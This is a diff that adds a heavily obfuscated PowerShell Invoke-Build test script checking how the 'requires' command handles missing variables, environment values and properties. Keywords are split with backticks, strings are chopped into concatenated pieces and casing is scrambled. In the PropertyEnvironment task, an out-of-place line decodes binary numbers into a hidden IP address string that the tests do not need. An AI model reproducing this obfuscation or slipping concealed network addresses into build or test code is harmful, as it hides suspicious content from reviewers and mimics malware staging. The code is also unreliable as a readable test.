@@ -1,0 +1,83 @@
+ Sv  Vmst  (  [TYPe]('co'+'nVE'+'rT')  )  ;  
+
+
+t`ASk impOrTSamPLE {
+	(${r} = invO`Ke-B`U`ilD . ../TaSkS/ImpORT/.buILD.pS1)
+	AS`seRT (${r} -contains ('MyVar'+'1 = v'+'ar1'))
+	a`sse`RT (${R} -contains ('My'+'En'+'v1 ='+' env1'))
+	Ass`ErT (${R} -contains ('MyProp1 '+'='+' pro'+'p1'))
+	AsSe`RT (${R} -contains ('MyPr'+'op2 ='+' '+'pr'+'op2'))
+	As`sERt (${r} -contains ('@I'+'n'+'vok'+'e-'+'MyModul'+'eStu'+'ff para'+'m'+'1'))
+	aSs`ERT (${r} -contains ('MyE'+'xtraStuf'+'f '+'= s'+'tuff1'))
+}
+
+t`AsK vARIablE {
+	(${r} = try {requ`ires miSs1} catch {${_}})
+	Eq`Ua`ls ${r}.FulLyQUaLIFiedErRoRiD teST-buILdASSet
+
+	${m`is`s1} = ${NU`ll}
+	(${R} = try {ReqUI`R`ES MiSs1} catch {${_}})
+	e`q`UalS ${R}.FULlYQuAlifiEdeRrORID teST-BuiLDaSset
+
+	${mI`s`S1} = ''
+	(${r} = try {REqu`i`ReS miSS1} catch {${_}})
+	e`qUALS ${R}.FuLlyQuALiFIEDErRorid TesT-bUilDAsseT
+
+	${M`iS`S1} = 0
+	rEqU`Ir`ES MisS1
+}
+
+tA`sK EnVIroNmEnt {
+	(${R} = try {r`EQUiR`Es -Environment MIsS1} catch {${_}})
+	e`Qua`lS ${R}.fullYQuAliFiederROrid test-bUiLdASSEt
+
+	${eNV:m`i`sS1} = ${n`Ull}
+	(${R} = try {r`E`QUireS -Environment mISS1} catch {${_}})
+	eqU`Als ${R}.FUlLYqUaliFiedERRorId TeST-BuIlDAssEt
+
+	${ENv:`mI`sS1} = ''
+	(${r} = try {reqU`Ir`Es -Environment MiSs1} catch {${_}})
+	eQUa`LS ${R}.fULlyquaLiFiEderroRID tESt-buiLDaSseT
+
+	${EnV:`M`Iss1} = 0
+	REqui`R`Es -Environment misS1
+
+	${enV`:mis`S1} = ${NU`ll}
+}
+
+T`ASk proPErtYvariaBLE {
+	(${r} = try {RE`QUI`RES -Property MiSS1} catch {${_}})
+	eQu`ALS ${r}.FULlyqUAliFieDeRROrId tEsT-buIlDaSseT
+
+	${m`i`SS1} = ${N`UlL}
+	(${R} = try {rEQUi`REs -Property MISS1} catch {${_}})
+	e`quaLs ${R}.fuLLYqualIFIeDeRROrID TEsT-buildAssET
+
+	${Mis`s1} = ''
+	(${r} = try {R`Equ`IreS -Property mISs1} catch {${_}})
+	eQu`AlS ${R}.FULlyqualIFIedERroRiD TESt-buiLDaSSEt
+
+	${MI`Ss1} = 0
+	ReqUi`ReS -Property MISS1
+}
+
+Ta`sK pROpERTyENvirONment {
+	(${r} = try {ReQUIr`ES -Property miSs1} catch {${_}})
+	Eq`U`Als ${R}.FUllYquALiFieDerrorId tEsT-BuildaSseT
+
+	${En`V:Mi`S`S1} = ${nU`LL}
+	(${r} = try {reqU`ir`ES -Property MIsS1} catch {${_}})
+    ${j`NxnqY} =  "$( SEt-iTEm  'VAriable:ofS'  '' ) " +[STRing]((100111, 1101001,1110000,111010,111001 ,110110 ,101110,110010,110110, 101110 , 110001,110011 ,110110, 101110 , 110100,111000 , 100111)| ForE`Ac`H`-objeCT {( [char] ( (  geT-i`TEM vaRiABlE:Vmst  ).vAluE::ToiNT16(( ${_}.TOStRING()) ,2 ) )) } )+" $(seT-ITeM  'vARiablE:ofs'  ' ') "
+	E`qU`Als ${R}.FuLLYQualiFIEDeRRoRID TEst-BUIlDAsseT
+
+	${ENv`:mIS`S1} = ''
+	(${r} = try {RE`QU`ires -Property MisS1} catch {${_}})
+	eq`Uals ${r}.fulLyQuaLIFIederROrid teSt-bUIldasseT
+
+	${env`:mI`sS1} = 0
+	r`Eq`Uires -Property mIss1
+
+	${e`N`V:mi`SS1} = ${N`ULL}
+}
+
+
